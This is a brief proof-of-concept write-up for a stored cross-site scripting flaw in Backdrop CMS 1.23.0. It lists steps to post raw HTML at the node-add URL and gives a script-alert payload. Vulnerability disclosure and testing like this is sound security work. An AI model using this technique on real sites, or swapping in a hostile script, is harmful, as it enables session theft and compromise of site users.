# Backdrop-CMS-1.23.0---Stored-XSS


==> Tutorial <==

1- Go to the following url. => http://(HOST)/backdrop/node/add/post
2- Write your xss payload in the body of the post. Formatting options should be RAW HTML to choose from.
3- Press "Save" button.

XSS Payload ==> "<script>alert("post_body")</script>
